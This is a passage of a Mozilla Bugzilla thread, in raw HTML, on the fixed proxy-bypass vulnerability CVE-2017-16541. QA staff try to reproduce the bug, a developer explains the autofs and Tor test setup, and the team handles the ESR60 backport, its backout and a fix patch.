        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-108"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-108" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c108">Comment 108</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-07-23 07:08 PDT" data-time="1532354933">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-108">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-108" data-comment-id="13490203">I didn't manage to reproduce the issue. I used an older version of Firefox (2017-10-26) on Ubuntu 16.04 x64 and macOS 10.13. 

Can you please give me some more detailed steps to reproduce or a screencast with the steps?
Thank you.</pre><div class="activity"><div class="change">Flags: needinfo?(arthuredelstein)</div></div></div><div class="change-set" id="c109"><div class="comment" data-id="13490246" data-no="109"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-109" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_349211" id="a23057290_451704"><img src="https://secure.gravatar.com/avatar/34a87f79fc3dd6985e4a1af2b4870a19?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_349211" id="a23057290_451704"><a class="email " href="/user_profile?user_id=349211" > <span class="fna">Georg Koppen</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-109"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-109" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c109">Comment 109</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-07-23 07:25 PDT" data-time="1532355941">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-109">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-109" data-comment-id="13490246">(In reply to Oana Botisan from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c108">comment #108</a>)
<span class="quote">&gt; I didn't manage to reproduce the issue. I used an older version of Firefox
&gt; (2017-10-26) on Ubuntu 16.04 x64 and macOS 10.13. 
&gt; 
&gt; Can you please give me some more detailed steps to reproduce or a screencast
&gt; with the steps?
&gt; Thank you.</span >

How did you try to reproduce this bug?</pre><div class="activity"><div class="change">Flags: needinfo?(oana.botisan)</div></div></div><div class="change-set" id="c110"><div class="comment" data-id="13490269" data-no="110"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-110" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_599255" id="a23057290_451704"><img src="https://secure.gravatar.com/avatar/889014bb763c199a5d7570eeee34f328?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_599255" id="a23057290_451704"><a class="email " href="/user_profile?user_id=599255" > <span class="fna">Oana Botisan, Desktop Release QA</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-110"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-110" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c110">Comment 110</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-07-23 07:33 PDT" data-time="1532356399">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-110">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-110" data-comment-id="13490269">With the steps from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c0">comment 0</a> mostly.
I used 2 different stations. One was on mac and the other on Ubuntu.
On mac I created the pref from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c103">comment 103</a> (network.file.path_blacklist set to /net). I changed the proxy and port and I opened the link from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c0">comment 0</a> (<a rel="nofollow" href="https://pearlcrescent.com/tor/am.html">https://pearlcrescent.com/tor/am.html</a>).

On Ubuntu, I opened Firefox, changed the pref and port and then in the terminal I wrote the command &quot;sudo tcpdump port 111&quot;.

Did I do everything wrong? Maybe I didn't understand fully what I have to do, because I got the same behaviour on the old builds as on the latest Nightly.</pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(oana.botisan)</span></div></div></div><div class="change-set" id="c111"><div class="comment" data-id="13490273" data-no="111"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-111" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_537703" id="a23057290_451704"><img src="https://secure.gravatar.com/avatar/edcdfd5affb524e0f88ec1a00ed3fe5d?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_537703" id="a23057290_451704"><a class="email " href="/user_profile?user_id=537703" > <span class="fna">Alex Gaynor [:Alex_Gaynor]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-111"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-111" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c111">Comment 111</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-07-23 07:34 PDT" data-time="1532356462">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-111">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-111" data-comment-id="13490273">What version of macOS are you on?

This issue will no longer occur on 10.13.3 or newer.</pre></div><div class="change-set" id="c112"><div class="comment" data-id="13490277" data-no="112"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-112" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_599255" id="a23057290_451704"><img src="https://secure.gravatar.com/avatar/889014bb763c199a5d7570eeee34f328?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_599255" id="a23057290_451704"><a class="email " href="/user_profile?user_id=599255" > <span class="fna">Oana Botisan, Desktop Release QA</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-112"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-112" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c112">Comment 112</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-07-23 07:35 PDT" data-time="1532356538">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-112">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-112" data-comment-id="13490277">I was on macOS 10.13. 
But the steps were correct?</pre></div><div class="change-set" id="c113"><div class="comment" data-id="13490572" data-no="113"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-113" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_349211" id="a23057290_451704"><img src="https://secure.gravatar.com/avatar/34a87f79fc3dd6985e4a1af2b4870a19?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_349211" id="a23057290_451704"><a class="email " href="/user_profile?user_id=349211" > <span class="fna">Georg Koppen</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-113"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-113" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c113">Comment 113</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-07-23 09:22 PDT" data-time="1532362949">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-113">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-113" data-comment-id="13490572">(In reply to Oana Botisan from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c110">comment #110</a>)
<span class="quote">&gt; With the steps from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c0">comment 0</a> mostly.
&gt; I used 2 different stations. One was on mac and the other on Ubuntu.
&gt; On mac I created the pref from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c103">comment 103</a> (network.file.path_blacklist set
&gt; to /net). I changed the proxy and port and I opened the link from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c0">comment 0</a>
&gt; (<a rel="nofollow" href="https://pearlcrescent.com/tor/am.html">https://pearlcrescent.com/tor/am.html</a>).
&gt; 
&gt; On Ubuntu, I opened Firefox, changed the pref and port and then in the
&gt; terminal I wrote the command &quot;sudo tcpdump port 111&quot;.
&gt; 
&gt; Did I do everything wrong? Maybe I didn't understand fully what I have to
&gt; do, because I got the same behaviour on the old builds as on the latest
&gt; Nightly.</span >

I am not sure regarding macOS but on Linux you need to install the autofs package and uncomment the line &quot;/net   -hosts&quot; in /etc/auto.master first as a preparation step. When testing our backport for this patch I configured Tor as a proxy (just installing Tor via your package manager should suffice and then entering 127.0.0.1:9050 as the SOCKS proxy host/port) and then looked at my local wireshark output. Hope this helps. Let me know if not.</pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(arthuredelstein)</span></div></div></div><div class="change-set" id="c114"><div class="comment" data-id="13493391" data-no="114"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-114" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_599255" id="a23057290_451704"><img src="https://secure.gravatar.com/avatar/889014bb763c199a5d7570eeee34f328?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_599255" id="a23057290_451704"><a class="email " href="/user_profile?user_id=599255" > <span class="fna">Oana Botisan, Desktop Release QA</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-114"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-114" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c114">Comment 114</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-07-24 08:13 PDT" data-time="1532445203">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-114">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-114" data-comment-id="13493391">I can't seem to be able to reproduce the issue, therefore I can't verify the fix. I will take out the qe+ flag.
Can you please verify to see if the bug is reproducing on the latest beta and Nightly?</pre><div class="activity"><div class="change">Flags: qe-verify+ &rarr; needinfo?(arthuredelstein)</div></div></div><div class="change-set" id="a23634845_488993"><div class="change" id="aa23634845_488993">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_488993" id="a23634845_488993"><img src="https://secure.gravatar.com/avatar/42f2a9436bbaefa7e0028e214f2b9350?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_488993" id="a23634845_488993"><a class="email " href="/user_profile?user_id=488993" > <span class="fna">Andrei Vaida [:avaida]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a23634845_488993"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a23634845_488993">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#a23634845_488993">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-07-27 01:39 PDT" data-time="1532680779">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Whiteboard: [tor 24052][sec-critical for Tor][necko-triaged] &rarr; [tor 24052][sec-critical for Tor][necko-triaged][post-critsmash-triage]</div></div></div><div class="change-set" id="c115"><div class="comment" data-id="13510115" data-no="115"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-115" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_363267" id="a23634845_488993"><img src="https://secure.gravatar.com/avatar/72977b89c86da4a19d3cf1d5920ea341?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_363267" id="a23634845_488993"><a class="email " href="/user_profile?user_id=363267" > <span class="fna">Christoph Kerschbaumer [:ckerschb]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-115"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-115" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c115">Comment 115</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-07-30 05:25 PDT" data-time="1532953542">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-115">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-115" data-comment-id="13510115">(In reply to :Gijs (he/him) from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c98">comment #98</a>)
<span class="quote">&gt; I'm late to this particular party, but should we perhaps still pursue this
&gt; in a follow-up bug as a belt-and-suspenders type mitigation in case
&gt; attackers find another type of path that somehow leaks information in this
&gt; way? Christoph?</span >

Yes, at least we should try. FWIW, I filed <a class="bz_bug_link
          bz_status_NEW"
   title="NEW - Evaluate if we can perform CheckLoadURI() checks before we ever call stat()"
   href="/show_bug.cgi?id=1479410">Bug 1479410</a> for that reason.</pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(ckerschb)</span></div></div></div><div class="change-set" id="c116"><div class="comment" data-id="13525960" data-no="116"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-116" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_75935" id="a23634845_488993"><img src="https://secure.gravatar.com/avatar/a10f7f199c75a9a5a1eb347730524a7a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_75935" id="a23634845_488993"><a class="email " href="/user_profile?user_id=75935" > <span class="fna">Ryan VanderMeulen [:RyanVM]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-116"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-116" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c116">Comment 116</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-08-06 15:12 PDT" data-time="1533593560">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-116">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-116" data-comment-id="13525960">Comment on <span class=""><a href="/attachment.cgi?id=8993178" name="attach_8993178" title="[ESR60]  patch">attachment 8993178</a> <a href="/attachment.cgi?id=8993178&amp;action=edit" title="[ESR60]  patch">[details]</a> <a href="/attachment.cgi?id=8993178&amp;action=diff" title="[ESR60]  patch">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1412081&amp;attachment=8993178'>[review]</a>
[ESR60]  patch

Fixes a critical issue for Tor browser users and behavior is behind a pref not exposed to regular Firefox users. Approved for ESR 60.2.</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8993178&amp;action=edit"
           title="[ESR60]  patch"
           class=""
        >Attachment #8993178</a> -
        Flags: approval-mozilla-esr60? &rarr; approval-mozilla-esr60+</div></div></div><div class="change-set" id="c117"><div class="comment" data-id="13526100" data-no="117"
       data-tags="uplift">
    
    <table class="layout-table change-head " id="ch-117" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_75935" id="a23634845_488993"><img src="https://secure.gravatar.com/avatar/a10f7f199c75a9a5a1eb347730524a7a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_75935" id="a23634845_488993"><a class="email " href="/user_profile?user_id=75935" > <span class="fna">Ryan VanderMeulen [:RyanVM]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-117"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-117" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c117">Comment 117</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-08-06 16:43 PDT" data-time="1533599005">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-117">
        <td colspan="2" class="comment-tags"><span class="comment-tag">uplift</span>
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-117" data-comment-id="13526100"><a rel="nofollow" href="https://hg.mozilla.org/releases/mozilla-esr60/rev/92ff98e2731e">https://hg.mozilla.org/releases/mozilla-esr60/rev/92ff98e2731e</a></pre><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox_esr60&amp;o1=isnotempty">status-firefox-esr60</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox_esr60&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox_esr60&amp;o1=equals&amp;v1=fixed">fixed</a></div></div></div><div class="change-set" id="c118"><div class="comment" data-id="13527195" data-no="118"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-118" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_75935" id="a23634845_488993"><img src="https://secure.gravatar.com/avatar/a10f7f199c75a9a5a1eb347730524a7a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_75935" id="a23634845_488993"><a class="email " href="/user_profile?user_id=75935" > <span class="fna">Ryan VanderMeulen [:RyanVM]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-118"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-118" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c118">Comment 118</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-08-07 07:05 PDT" data-time="1533650720">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-118">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-118" data-comment-id="13527195">Backed out from ESR60 for Linux/OSX leaks and Windows GTest failures.
<a rel="nofollow" href="https://treeherder.mozilla.org/logviewer.html#?job_id=192445004&amp;repo=mozilla-esr60">https://treeherder.mozilla.org/logviewer.html#?job_id=192445004&amp;repo=mozilla-esr60</a>
<a rel="nofollow" href="https://treeherder.mozilla.org/logviewer.html#?job_id=192444271&amp;repo=mozilla-esr60">https://treeherder.mozilla.org/logviewer.html#?job_id=192444271&amp;repo=mozilla-esr60</a>

<a rel="nofollow" href="https://hg.mozilla.org/releases/mozilla-esr60/rev/1ab79799a5e9">https://hg.mozilla.org/releases/mozilla-esr60/rev/1ab79799a5e9</a></pre><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox_esr60&amp;o1=isnotempty">status-firefox-esr60</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox_esr60&amp;o1=equals&amp;v1=fixed">fixed</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox_esr60&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">Flags: needinfo?(valentin.gosu)</div></div></div><div class="change-set" id="c119"><div class="comment" data-id="13528169" data-no="119"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-119" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_415378" id="a23634845_488993"><img src="https://secure.gravatar.com/avatar/dedff9d4500fcbc5cdd1cd270f044b33?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_415378" id="a23634845_488993"><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-119"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-119" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c119">Comment 119</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-08-07 12:07 PDT" data-time="1533668879">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-119">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-119" data-comment-id="13528169">(In reply to Ryan VanderMeulen [:RyanVM] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c118">comment #118</a>)
<span class="quote">&gt; Backed out from ESR60 for Linux/OSX leaks and Windows GTest failures.</span >

The leaks are caused by the fact that <span class=""><a href="/attachment.cgi?id=8990057" name="attach_8990057" title="Call KillClearOnShutdown(ShutdownPhase::ShutdownFinal) in PluginProcessChild on all platforms">attachment 8990057</a> <a href="/attachment.cgi?id=8990057&amp;action=edit" title="Call KillClearOnShutdown(ShutdownPhase::ShutdownFinal) in PluginProcessChild on all platforms">[details]</a> <a href="/attachment.cgi?id=8990057&amp;action=diff" title="Call KillClearOnShutdown(ShutdownPhase::ShutdownFinal) in PluginProcessChild on all platforms">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1412081&amp;attachment=8990057'>[review]</a> should also land with the ESR patch.
Looking at the gtest failure now.</pre></div><div class="change-set" id="a24623039_75935"><div class="change" id="aa24623039_75935">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_75935" id="a24623039_75935"><img src="https://secure.gravatar.com/avatar/a10f7f199c75a9a5a1eb347730524a7a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_75935" id="a24623039_75935"><a class="email " href="/user_profile?user_id=75935" > <span class="fna">Ryan VanderMeulen [:RyanVM]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a24623039_75935"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a24623039_75935">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#a24623039_75935">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-08-07 12:09 PDT" data-time="1533668973">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8990057&amp;action=edit"
           title="Call KillClearOnShutdown(ShutdownPhase::ShutdownFinal) in PluginProcessChild on all platforms"
           class=""
        >Attachment #8990057</a> -
        Flags: approval-mozilla-esr60+</div></div></div><div class="change-set" id="c120"><div class="comment" data-id="13528417" data-no="120"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-120" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_415378" id="a24623039_75935"><img src="https://secure.gravatar.com/avatar/dedff9d4500fcbc5cdd1cd270f044b33?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_415378" id="a24623039_75935"><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-120"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-120" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c120">Comment 120</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-08-07 13:59 PDT" data-time="1533675576">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-120">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8998347"
         class="attachment patch"
         data-id="8998347" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="esr_fix.patch">
      <meta itemprop="contentSize" content="963">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8998347">
          <a class="link" href="attachment.cgi?id=8998347&amp;action=diff">
        <span id="att-8998347-description" itemprop="description">esr_fix.patch</span></a>
        — <a href="attachment.cgi?id=8998347&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1412081&attachment=8998347">Splinter Review</a>
      </div>
    </div>

  
    <pre
        class="comment-text  "
        id="ct-120" data-comment-id="13528417">As the comment in the patch says, the changes I made required the whitelist to be properly instantiated - which the gtest did not previously do.</pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(valentin.gosu)</span></div></div></div><div class="change-set" id="c121"><div class="comment" data-id="13528504" data-no="121"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-121" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_75935" id="a24623039_75935"><img src="https://secure.gravatar.com/avatar/a10f7f199c75a9a5a1eb347730524a7a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_75935" id="a24623039_75935"><a class="email " href="/user_profile?user_id=75935" > <span class="fna">Ryan VanderMeulen [:RyanVM]</span></a>
</div>
          </td>

